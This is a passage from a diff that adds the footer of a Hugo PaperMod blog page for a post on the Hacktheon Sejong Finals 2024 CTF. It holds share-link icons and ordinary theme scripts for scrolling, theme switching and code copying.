+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Hacktheon Sejong Finals 2024 on telegram"
+        href="https://telegram.me/share/url?text=Hacktheon%20Sejong%20Finals%202024&amp;url=https%3a%2f%2fzeynarz.github.io%2fposts%2fhacktheon_24%2f">
+        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Hacktheon Sejong Finals 2024 on ycombinator"
+        href="https://news.ycombinator.com/submitlink?t=Hacktheon%20Sejong%20Finals%202024&u=https%3a%2f%2fzeynarz.github.io%2fposts%2fhacktheon_24%2f">
+        <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
+            xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+            <path
+                d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+        </svg>
+    </a>
+</div>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://zeynarz.github.io/">zeynarz</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
